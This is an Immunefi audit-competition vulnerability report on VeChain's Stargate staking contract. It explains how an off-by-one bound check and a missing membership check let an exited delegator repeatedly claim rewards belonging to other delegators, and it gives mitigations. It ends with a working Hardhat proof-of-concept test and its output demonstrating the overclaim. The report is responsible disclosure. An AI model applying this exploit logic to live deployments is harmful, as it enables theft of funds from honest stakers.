# 59919 sc high loss of funds delegators can claim rewards for periods where they had no stake

* Report ID: #59919
* Report Type: Smart Contract
* Report severity: High
* Target: <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* Submitted on: Nov 17th 2025 at 00:35:59 UTC by @xKeywordx
* Competition: Audit Comp | Vechain | Stargate Hayabusa (<https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa>)

## #59919 \[SC-High] Loss of funds - Delegators can claim rewards for periods where they had no stake

### Summary

An NFT (tokenId) that has EXITED a delegation can still claim rewards for periods after its delegation ended. This is caused by an underconstrained check in `_claimableDelegationPeriods` combined with missing membership checks in `_claimableRewardsForPeriod`. The issue allows repeated overclaiming of rewards from other delegators for periods in which the attacker no longer had stake.

{% stepper %}
{% step %}

### 1. Delegate normally

When delegating, the contract sets:

```solidity
(, , , uint32 completedPeriods) = $.protocolStakerContract.getValidationPeriodDetails(_validator);
// e.g. completedPeriods = 13

$.lastClaimedPeriod[_tokenId] = completedPeriods + 1; // = 14
_updatePeriodEffectiveStake($, _validator, _tokenId, completedPeriods + 2, true);
// => effective stake added starting from period 15
```

* startPeriod becomes completedPeriods + 2 (e.g. 15).
* lastClaimedPeriod is completedPeriods + 1 (e.g. 14) so the first claimable period is 15.
  {% endstep %}

{% step %}

### 2. Request exit while ACTIVE

When requesting exit during an ACTIVE delegation:

```solidity
// inside requestDelegationExit(...)
$.protocolStakerContract.signalDelegationExit(delegationId);

(, , , uint32 completedPeriods) = $.protocolStakerContract.getValidationPeriodDetails(delegation.validator);
// e.g. completedPeriods = 14 (current validator period = 15)

_updatePeriodEffectiveStake($, delegation.validator, _tokenId, completedPeriods + 2, false);
// => remove effective stake starting from period 16
```

* ProtocolStaker sets endPeriod to the period in which exit was requested (e.g. 15).
* Checkpoint logic ensures the token is counted in delegatorsEffectiveStake for period 15 and excluded for periods ≥16.
* From protocol perspective: delegation is active only in \[startPeriod = 15, endPeriod = 15].
  {% endstep %}

{% step %}

### 3. Let several validator periods pass

Time passes; validator keeps operating:

* getValidationPeriodDetails now returns a much larger completedPeriods (e.g. 30).
* currentValidatorPeriod = completedPeriods + 1 (e.g. 31).
* Delegation details remain startPeriod = 15, endPeriod = 15 (delegation is EXITED).
* delegatorsEffectiveStake includes token stake at period 15 only and excludes it for periods 16+.
  {% endstep %}

{% step %}

### 4. Claimable window erroneously extends past endPeriod

Inside `_claimableDelegationPeriods` the problematic check is:

```solidity
if (
    endPeriod != type(uint32).max &&
    endPeriod < currentValidatorPeriod &&
    endPeriod > nextClaimablePeriod  // <-- strict '>' causes bypass when endPeriod == nextClaimablePeriod
) {
    return (nextClaimablePeriod, endPeriod);
}
```

With startPeriod = 15, endPeriod = 15, currentValidatorPeriod = 31, and nextClaimablePeriod = 15:

* endPeriod != max -> true
* endPeriod < currentValidatorPeriod -> true (15 < 31)
* endPeriod > nextClaimablePeriod -> false (15 > 15 is false)

So this branch is not taken. The fallback returns:

```solidity
if (nextClaimablePeriod < currentValidatorPeriod) {
    return (nextClaimablePeriod, completedPeriods); // (15, 30)
}
```

Therefore the claimable window becomes \[15, 30] even though the delegation ended at 15. `_claimableRewardsForPeriod` then computes rewards for each of these periods.
{% endstep %}

{% step %}

### 5. Repeatable theft

* The delegation mapping is not cleared upon requesting exit.
* After overclaiming, the attacker can wait for new periods and call `claimRewards` again.
* The same flawed logic computes a claimable window that includes post-exit periods, allowing repeated claims.
  {% endstep %}
  {% endstepper %}

### Root cause

Two logic issues combine to enable the exploit:

1. Off-by-one / underconstrained check in `_claimableDelegationPeriods`:

```solidity
if (
    endPeriod != type(uint32).max &&
    endPeriod < currentValidatorPeriod &&
    endPeriod > nextClaimablePeriod  // strict '>' allows case endPeriod == nextClaimablePeriod to fallthrough
) {
    return (nextClaimablePeriod, endPeriod);
}
```

Because it uses strict `>` rather than `>=`, if `endPeriod == nextClaimablePeriod` the clause is bypassed, and the function can return a lastClaimablePeriod larger than endPeriod.

2. Missing delegation membership check in `_claimableRewardsForPeriod`:

```solidity
uint256 effectiveStake = _calculateEffectiveStake($, _tokenId);
uint256 delegatorsEffectiveStake = $.delegatorsEffectiveStake[validator].upperLookup(_period);
if (delegatorsEffectiveStake == 0) {
    return 0;
}
return (effectiveStake * delegationPeriodRewards) / delegatorsEffectiveStake;
```

* The function assumes if delegatorsEffectiveStake > 0 then the token is part of it.
* It never checks whether \_period lies in the delegation's \[startPeriod, endPeriod].
* After exit, the aggregator removed the token from delegatorsEffectiveStake for future periods, but effectiveStake for the token is still used in the numerator — enabling a share of rewards for periods it was not part of.

Combined, these issues let an exited delegator claim rewards for periods they were not staked.

### Impact

* Direct theft of funds (vtho) from rewards pools intended for currently-staked delegators.
* Theft of unclaimed royalties / yield.
* The attack is repeatable; an exited delegator can repeatedly overclaim as new periods pass.
* Losses redistribute from honest delegators of the same validator to the attacker.

{% hint style="warning" %}
This is a high-severity, repeatable exploit that allows a delegator to claim rewards for periods after they have exited — effectively stealing rewards from other delegators.
{% endhint %}

### Recommended mitigation

* Revisit reward accounting around exited delegations.
* Tighten `_claimableDelegationPeriods` checks so that when endPeriod == nextClaimablePeriod the returned last claimable period never exceeds endPeriod (e.g., use >= where appropriate or otherwise ensure correct bounds).
* In `_claimableRewardsForPeriod`, ensure the token is actually a member of the delegators pool for the given period (i.e., verify the period is within \[startPeriod, endPeriod] for that delegation) before using its effectiveStake in reward calculations.
* Consider clearing or invalidating delegation mapping or effective stake for tokenIds upon exit in a way that prevents reusing stale effectiveStake values for future periods.

### Proof of Concept

<details>

<summary>Test PoC (Rewards.test.ts)</summary>

```javascript
    it.only("should overclaim rewards after delegation exit due to off-by-one period bounds", async () => {
        const levelSpec = await stargateNFTMock.getLevel(LEVEL_ID);

        // User1 stakes & delegates tokenId1
        tx = await stargateContract.connect(user).stake(LEVEL_ID, {
            value: levelSpec.vetAmountRequiredToStake,
        });
        await tx.wait();
        const tokenId1 = await stargateNFTMock.getCurrentTokenId();
        console.log("User1 staked tokenId1:", tokenId1);

        tx = await stargateContract.connect(user).delegate(tokenId1, validator.address);
        await tx.wait();
        console.log("User1 delegated tokenId1 to validator", validator.address);

        // User2 stakes & delegates tokenId2 to same validator
        // This keeps delegatorsEffectiveStake > 0 even after user1 exits.
        tx = await stargateContract.connect(otherUser).stake(LEVEL_ID, {
            value: levelSpec.vetAmountRequiredToStake,
        });
        await tx.wait();
        const tokenId2 = await stargateNFTMock.getCurrentTokenId();
        console.log("User2 staked tokenId2:", tokenId2);

        tx = await stargateContract.connect(otherUser).delegate(tokenId2, validator.address);
        await tx.wait();
        console.log("User2 delegated tokenId2 to validator", validator.address);

        expect(await stargateContract.getDelegationStatus(tokenId1)).to.equal(DELEGATION_STATUS_PENDING);
        expect(await stargateContract.getDelegationStatus(tokenId2)).to.equal(DELEGATION_STATUS_PENDING);

        // Fast-forward so both delegations are ACTIVE and there are completed periods
        let currentPeriod = 5;
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, currentPeriod - 1);
        await tx.wait();
        console.log("Set validator completed periods to", currentPeriod - 1);

        expect(await stargateContract.getDelegationStatus(tokenId1)).to.equal(DELEGATION_STATUS_ACTIVE);
        expect(await stargateContract.getDelegationStatus(tokenId2)).to.equal(DELEGATION_STATUS_ACTIVE);

        // FIRST CLAIM while delegation is ACTIVE (before exit)
        // This should claim rewards from startPeriod up to completedPeriods (4),
        // leaving period 5 as the only remaining legitimate period.
        const preClaimBalanceUser = await vthoTokenContract.balanceOf(user.address);
        const firstClaimable = await stargateContract["claimableRewards(uint256)"](tokenId1);
        console.log("First claimable rewards (before exit):", firstClaimable);
        expect(firstClaimable).to.be.gt(0n);

        tx = await stargateContract.connect(user).claimRewards(tokenId1);
        const receipt1 = await tx.wait();
        console.log("User performed first claim, tx hash:", receipt1?.hash);

        const postFirstClaimBalance = await vthoTokenContract.balanceOf(user.address);
        expect(postFirstClaimBalance - preClaimBalanceUser).to.equal(firstClaimable);

        const claimableAfterFirst = await stargateContract["claimableRewards(uint256)"](tokenId1);
        console.log("Claimable rewards immediately after first claim:", claimableAfterFirst);
        expect(claimableAfterFirst).to.equal(0n);

        // At this point, the state for User1 looks like this:
        // - startPeriod  = 2
        // - lastClaimedPeriod = 4
        // - nextClaimablePeriod = 5

        // Request exit in current active period (currentPeriod = 5) so that endPeriod == currentPeriod = 5
        tx = await stargateContract.connect(user).requestDelegationExit(tokenId1);
        await tx.wait();
        console.log("-------------------------------------------");
        console.log("User requested delegation exit for tokenId1");

        // Still ACTIVE in current period immediately after request
        expect(await stargateContract.getDelegationStatus(tokenId1)).to.equal(DELEGATION_STATUS_ACTIVE);

        // Advance periods far beyond endPeriod so completedPeriods > endPeriod
        currentPeriod = 15;
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, currentPeriod - 1);
        await tx.wait();
        console.log("Set validator completed periods to", currentPeriod - 1);

        // Now delegation for tokenId1 should be EXITED
        expect(await stargateContract.getDelegationStatus(tokenId1)).to.equal(DELEGATION_STATUS_EXITED);

        // Fetch underlying delegation period details from ProtocolStakerMock
        const delegationId1 = await stargateContract.getDelegationIdOfToken(tokenId1);
        const [startPeriod, endPeriod] = await protocolStakerMock.getDelegationPeriodDetails(delegationId1);
        console.log("Delegation periods for tokenId1 -> start:", startPeriod, "end:", endPeriod);

        // Ask Stargate for claimable delegation periods AFTER exit
        const [firstClaimablePeriod, lastClaimablePeriod] = await stargateContract.claimableDelegationPeriods(tokenId1);
        console.log("Stargate claimable periods AFTER exit -> first:", firstClaimablePeriod, "last:", lastClaimablePeriod);

        // Intended invariant:
        //   lastClaimablePeriod <= endPeriod
        //
        // Actual (BUG):
        //   endPeriod == nextClaimablePeriod
        //   strict `endPeriod > nextClaimablePeriod` check fails
        //   fallback branch returns (nextClaimablePeriod, completedPeriods)
        //
        // So we get:
        //   firstClaimablePeriod == endPeriod
        //   lastClaimablePeriod  == completedPeriods (>> endPeriod)
        expect(firstClaimablePeriod).to.equal(endPeriod);
        expect(lastClaimablePeriod).to.be.gt(endPeriod); // window extends beyond delegation end

        // PROVE that this inflated period window leads to overclaiming rewards
        const secondClaimable = await stargateContract["claimableRewards(uint256)"](tokenId1);
        console.log("Second claimable rewards AFTER exit:", secondClaimable);
        expect(secondClaimable).to.be.gt(REWARDS_PER_PERIOD);

        const balanceBeforeSecondClaim = await vthoTokenContract.balanceOf(user.address);
        tx = await stargateContract.connect(user).claimRewards(tokenId1);
        const receipt2 = await tx.wait();
        console.log("User1 performed second claim, tx hash:", receipt2?.hash);

        const balanceAfterSecondClaim = await vthoTokenContract.balanceOf(user.address);
        const actuallyClaimedSecond = balanceAfterSecondClaim - balanceBeforeSecondClaim;
        console.log("Actually claimed in second claim:", actuallyClaimedSecond);

        expect(actuallyClaimedSecond).to.equal(secondClaimable);
        expect(actuallyClaimedSecond).to.be.gt(REWARDS_PER_PERIOD);

        //the issue can keep repeating indefinitely
        console.log("------------------------------------");

        currentPeriod = 25;
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, currentPeriod - 1);
        await tx.wait();
        console.log("Set validator completed periods to", currentPeriod - 1);
        const delegationId2 = await stargateContract.getDelegationIdOfToken(tokenId1);
        const [startPeriod2, endPeriod2] = await protocolStakerMock.getDelegationPeriodDetails(delegationId2);
        console.log("Delegation periods for tokenId1 -> start:", startPeriod2, "end:", endPeriod2);

        const [firstClaimablePeriod2, lastClaimablePeriod2] = await stargateContract.claimableDelegationPeriods(tokenId1);
        console.log("Stargate claimable periods AFTER exit -> second:", firstClaimablePeriod2, "last:", lastClaimablePeriod2);

        const balanceBeforeThirdClaim = await vthoTokenContract.balanceOf(user.address);
        tx = await stargateContract.connect(user).claimRewards(tokenId1);
        const receipt3 = await tx.wait();
        console.log("User1 performed third claim, tx hash:", receipt3?.hash);

        const balanceAfterThirdClaim = await vthoTokenContract.balanceOf(user.address);
        const actuallyClaimedThird = balanceAfterThirdClaim - balanceBeforeThirdClaim;
        console.log("Actually claimed in third claim:", actuallyClaimedThird);
    });
```

Test output (truncated):

```
  shard-u4: Stargate: Rewards
User1 staked tokenId1: 10001n
User1 delegated tokenId1 to validator 0x90F79bf6EB2c4f870365E785982E1f101E93b906
User2 staked tokenId2: 10002n
User2 delegated tokenId2 to validator 0x90F79bf6EB2c4f870365E785982E1f101E93b906
Set validator completed periods to 4
First claimable rewards (before exit): 150000000000000000n
User performed first claim, tx hash: 0x9dc2fa13...
Claimable rewards immediately after first claim: 0n
-------------------------------------------
User requested delegation exit for tokenId1
Set validator completed periods to 14
Delegation periods for tokenId1 -> start: 2n end: 5n
Stargate claimable periods AFTER exit -> first: 5n last: 14n
Second claimable rewards AFTER exit: 750000000000000000n
User1 performed second claim, tx hash: 0x93d4d4c7...
Actually claimed in second claim: 750000000000000000n
------------------------------------
Set validator completed periods to 24
Delegation periods for tokenId1 -> start: 2n end: 5n
Stargate claimable periods AFTER exit -> second: 13n last: 24n
User1 performed third claim, tx hash: 0xb9c5b1da...
Actually claimed in third claim: 800000000000000000n
    ✔ should overclaim rewards after delegation exit due to off-by-one period bounds (186ms)
```

As shown, the user repeatedly claims rewards for periods after exit.

</details>
